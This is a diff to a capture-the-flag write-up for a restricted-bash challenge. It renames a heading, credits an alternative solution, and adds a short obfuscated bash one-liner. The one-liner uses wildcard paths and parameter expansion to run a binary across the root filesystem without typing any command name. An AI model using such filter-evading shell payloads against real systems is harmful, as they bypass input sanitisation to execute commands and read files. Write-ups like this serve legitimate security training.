@@ -8,7 +8,7 @@
 
 ## Exploit
 
-**retrieving letter t**
+**retrieving letters**
 
 ```bash
 Command executed
@@ -83,4 +83,9 @@ _________=${_:$((($$/$$+$$/$$+$$/$$)*($$/$$+$$/$$))):$(($$/$$))};__=~;___=${#_[*
 
 ## Bis
 
-Another unintended solution in [solve.py](./solve.py)
+Another unintended solution in [solve.py](./solve.py) (cc @Oiy)
+
+## Bis n°2
+
+A shorter version of solution 1: `__=(~/???/???);____=${__##*/};$({$____,/*})` (@Mistrale)
+
